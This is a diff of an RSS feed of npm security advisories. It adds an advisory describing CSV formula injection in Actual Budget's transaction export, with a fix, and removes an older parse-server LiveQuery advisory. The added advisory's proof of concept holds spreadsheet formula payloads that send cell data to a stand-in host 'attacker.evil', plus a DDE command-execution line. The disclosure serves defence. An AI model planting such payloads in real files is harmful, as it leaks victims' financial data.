@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-06-22T23:46:31.932Z</updated>
+    <updated>2026-06-23T01:48:46.032Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,105 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@actual-app/web] @actual-app/web has CSV Formula Injection in Transaction Export via Imported Payee/Notes Fields]]></title>
+        <id>https://github.com/advisories/GHSA-xqjm-27pc-rvwm</id>
+        <link href="https://github.com/advisories/GHSA-xqjm-27pc-rvwm"/>
+        <updated>2026-06-22T23:48:40.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>exportToCSV</code> and <code>exportQueryToCSV</code> in <code>packages/loot-core/src/server/transactions/export/export-to-csv.ts</code> pass user-controlled <code>Payee</code>, <code>Notes</code>, <code>Account</code>, and <code>Category</code> strings to <code>csv-stringify</code> with no <code>cast</code> callback and no formula-prefix neutralization. Strings that begin with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, tab, or carriage return survive verbatim into the exported CSV. When the victim (or anyone they share the export with) opens the file in Excel, LibreOffice Calc, or Google Sheets, the strings are interpreted as formulas. <code>=HYPERLINK("http://attacker/?leak="&amp;B2,"Bank refund")</code> is the most reliable variant: it renders as a clickable link with benign text and exfiltrates adjacent cells (transaction amount, account name, payee, balance) on click, with no security prompt in modern Excel/Sheets. <code>=WEBSERVICE</code>/<code>=IMPORTXML</code> provide auto-firing exfil in some configurations; legacy DDE may achieve RCE on older Excel.</p>
+<h2 id="details">Details</h2>
+<p>Sink — <code>packages/loot-core/src/server/transactions/export/export-to-csv.ts:56</code>:</p>
+<pre><code class="language-ts">return csvStringify(transactionsForExport, { header: true });
+</code></pre>
+<p>and the same call again at <code>export-to-csv.ts:131</code> for <code>exportQueryToCSV</code>. <code>csv-stringify</code> v6 does not neutralize formula-trigger characters by default; only quote/comma/CRLF escaping is applied. There is no shared wrapper — <code>grep</code> for <code>csvStringify</code> finds exactly one source file across the monorepo.</p>
+<p>Source of attacker-controlled <code>Payee</code>/<code>Notes</code>:</p>
+<ul>
+<li><code>packages/loot-core/src/server/transactions/import/parse-file.ts:77</code> dispatches uploaded files to <code>parseCSV</code> (<code>:109</code>), <code>parseOFX</code> (<code>:200</code>), <code>parseQIF</code> (<code>:158</code>), <code>parseCAMT</code> (<code>:250</code>). None of them strip or escape formula prefixes from <code>payee_name</code>/<code>imported_payee</code>/<code>notes</code>.</li>
+<li>For OFX, <code>mapOfxTransaction</code> in <code>packages/loot-core/src/server/transactions/import/ofx2json.ts</code> only runs <code>html2Plain</code> (HTML entity decoding) on the NAME field — <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, <code>\t</code> are untouched.</li>
+<li><code>sync.normalizeTransactions</code> (<code>packages/loot-core/src/server/transactions/sync.ts</code>) applies <code>title()</code> casing, which only mutates letters via <code>String.toLowerCase</code>; non-letter prefix characters are preserved, and Excel formulas are case-insensitive (<code>=hyperlink(...)</code> parses identically to <code>=HYPERLINK(...)</code>).</li>
+<li>The payee can also be entered directly through the UI or set via the <code>@actual-app/api</code>'s payee/transaction CRUD endpoints — anyone with write access to a shared budget can plant the payload.</li>
+</ul>
+<p>Verification that <code>csv-stringify</code> does not neutralize formulas:</p>
+<pre><code>$ node -e "const{stringify}=require('csv-stringify/sync');console.log(stringify([{Payee:'=HYPERLINK(\"http://x/?\"&amp;B2,\"refund\")'}],{header:true}))"
+Payee
+"=HYPERLINK(""http://x/?""&amp;B2,""refund"")"
+</code></pre>
+<p>The double-quote escaping is intact, but the leading <code>=</code> is not prefixed with <code>'</code> or otherwise neutralized — Excel, LibreOffice Calc, and Google Sheets will all evaluate this as a formula on open.</p>
+<h2 id="poc">PoC</h2>
+<ol>
+<li>Attacker delivers a malicious file the victim is willing to import (fake bank OFX statement, shared budget file, expense-tracking CSV from a collaborator). Example malicious CSV the victim drops into "Import file":</li>
+</ol>
+<pre><code>Date,Payee,Amount
+2026-01-01,"=HYPERLINK(""http://attacker.evil/leak?d=""&amp;B2&amp;C2,""Bank refund details"")",100.00
+2026-01-02,"@SUM(1+1)*cmd|'/c calc'!A0",50.00
+2026-01-03,"+1+1",-25.00
+2026-01-04,"=WEBSERVICE(""http://attacker.evil/?d=""&amp;B2)",10.00
+</code></pre>
+<ol start="2">
+<li>Victim imports through Account → Import file. <code>parseFile</code> (<code>parse-file.ts:77</code>) → <code>parseCSV</code>/<code>parseOFX</code>/<code>parseQIF</code>/<code>parseCAMT</code> returns rows with the formula strings preserved as <code>payee_name</code>. <code>sync.normalizeTransactions</code> does not strip the prefix characters.</li>
+<li>Payees are persisted into the <code>payees</code> table verbatim.</li>
+<li>Some time later the victim runs Account → menu → Export. <code>transactions-export-query</code> invokes <code>exportQueryToCSV</code> (<code>export-to-csv.ts:131</code>).</li>
+<li>The exported file looks like (verified output shape from <code>csvStringify</code>):</li>
+</ol>
+<pre><code>Account,Date,Payee,Notes,Category_Group,Category,Amount,Split_Amount,Cleared
+Checking,2026-01-01,"=HYPERLINK(""http://attacker.evil/leak?d=""&amp;B2&amp;C2,""Bank refund details"")",,,,100.00,0,Not cleared
+Checking,2026-01-02,@SUM(1+1)*cmd|'/c calc'!A0,,,,50.00,0,Not cleared
+Checking,2026-01-03,+1+1,,,,-25.00,0,Not cleared
+Checking,2026-01-04,"=WEBSERVICE(""http://attacker.evil/?d=""&amp;B2)",,,,10.00,0,Not cleared
+</code></pre>
+<ol start="6">
+<li>Victim or downstream recipient (accountant, spouse, tax preparer) opens the CSV in Excel/LibreOffice/Sheets. <code>=HYPERLINK(...)</code> renders as a clickable link that exfiltrates adjacent cell values to attacker on click; <code>=WEBSERVICE</code>/<code>=IMPORTXML</code> (Sheets/LibreOffice) fire automatically; legacy <code>=cmd|...</code> DDE may execute on unpatched Excel.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Confidentiality</strong>: Adjacent transaction data (amounts, account names, balances, payees, categories) can be exfiltrated to attacker-controlled URLs through <code>=HYPERLINK</code> clicks or auto-firing <code>=WEBSERVICE</code>/<code>=IMPORTXML</code>.</li>
+<li><strong>Integrity</strong>: Spreadsheet recipients (accountants, tax preparers) see attacker-chosen display values where they expected raw payee names, enabling fraud (e.g., forged "Refund" line items linking to phishing).</li>
+<li><strong>Reach</strong>: Exports from Actual Budget are commonly shared with third parties (accountants, tax software, household members). One malicious imported statement contaminates every future export of that budget.</li>
+<li><strong>Note on AC:H</strong>: requires victim-driven import → export → spreadsheet open. Modern Excel disables DDE by default, narrowing the RCE pathway, but <code>=HYPERLINK</code> exfil is universal and silent.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Pass a <code>cast.string</code> callback to <code>csv-stringify</code> that prefixes any formula-trigger string with a single quote, the OWASP-recommended neutralization. Apply at both call sites in <code>packages/loot-core/src/server/transactions/export/export-to-csv.ts</code>:</p>
+<pre><code class="language-ts">import { stringify as csvStringify } from 'csv-stringify/sync';
+
+const FORMULA_PREFIX = /^[=+\-@\t\r]/;
+
+function neutralizeFormula(value: string): string {
+  return FORMULA_PREFIX.test(value) ? `'${value}` : value;
+}
+
+const csvOptions = {
+  header: true,
+  cast: {
+    string: (value: string) =&gt; neutralizeFormula(value),
+  },
+} as const;
+
+// export-to-csv.ts:56
+return csvStringify(transactionsForExport, csvOptions);
+
+// export-to-csv.ts:131
+return csvStringify(transactionsForExport, csvOptions);
+</code></pre>
+<p>Alternative defenses to consider in addition:</p>
+<ul>
+<li>Strip/neutralize formula prefixes on import in <code>parse-file.ts</code> for <code>payee_name</code>/<code>notes</code> so the database never contains formula-shaped strings (defense in depth — protects any future export consumers).</li>
+<li>Add a regression unit test that asserts every CSV cell starting with <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, <code>\t</code>, or <code>\r</code> is prefixed with <code>'</code>.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/actualbudget/actual/security/advisories/GHSA-xqjm-27pc-rvwm">https://github.com/actualbudget/actual/security/advisories/GHSA-xqjm-27pc-rvwm</a></li>
+<li><a href="https://github.com/advisories/GHSA-xqjm-27pc-rvwm">https://github.com/advisories/GHSA-xqjm-27pc-rvwm</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xqjm-27pc-rvwm</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-22T23:48:40.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[@budibase/backend-core] @budibase/backend-core has potential SSRF DNS rebinding bypass in outbound fetch validation]]></title>
         <id>https://github.com/advisories/GHSA-gfq7-5x4g-3xhf</id>
@@ -3373,32 +3472,5 @@ if __name__ == "__main__":
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-19T21:42:46.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[parse-server] parse-server: LiveQuery discloses object data to a subscriber across an ACL read-access change]]></title>
-        <id>https://github.com/advisories/GHSA-97pr-9hgg-3p8r</id>
-        <link href="https://github.com/advisories/GHSA-97pr-9hgg-3p8r"/>
-        <updated>2026-06-19T21:42:50.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A Parse Server LiveQuery subscriber can receive object field values they are not authorized to read when a single <code>save</code> changes both an object field and the subscriber's ACL read access to that object. When such a save removes the subscriber's read access, the resulting <code>leave</code> event still carries the post-update object body, disclosing the new field values the subscriber is no longer permitted to read. The symmetric case applies to the <code>enter</code> event: when a save grants read access, the event includes the pre-grant object state the subscriber was not previously permitted to read. The disclosure is bounded to the single object affected by that save and is delivered only to the subscriber whose access changed. Applications that combine content changes with access-control changes in the same save on LiveQuery-enabled classes are affected.</p>
-<h3 id="patches">Patches</h3>
-<p>Parse Server now verifies the subscriber's authorization for the specific object state included in <code>leave</code> and <code>enter</code> events. For a <code>leave</code> caused by the subscriber losing read access, the event delivers the last object state the subscriber was authorized to see instead of the post-update body. For an <code>enter</code> caused by the subscriber gaining read access, the previously unauthorized original object state is omitted. Events caused by a normal query-match change, where the subscriber keeps read access, are unaffected, as are master-key subscribers.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Do not change an object's field values and a subscriber's ACL read access in the same <code>save</code> on LiveQuery-enabled classes; perform the access-control change in a separate save before or after the content change. Alternatively, limit which classes are enabled for LiveQuery.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-97pr-9hgg-3p8r">https://github.com/parse-community/parse-server/security/advisories/GHSA-97pr-9hgg-3p8r</a></li>
-<li><a href="https://github.com/parse-community/parse-server/pull/10515">https://github.com/parse-community/parse-server/pull/10515</a></li>
-<li><a href="https://github.com/parse-community/parse-server/pull/10516">https://github.com/parse-community/parse-server/pull/10516</a></li>
-<li><a href="https://github.com/advisories/GHSA-97pr-9hgg-3p8r">https://github.com/advisories/GHSA-97pr-9hgg-3p8r</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-97pr-9hgg-3p8r</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-06-19T21:42:48.000Z</published>
     </entry>
 </feed>
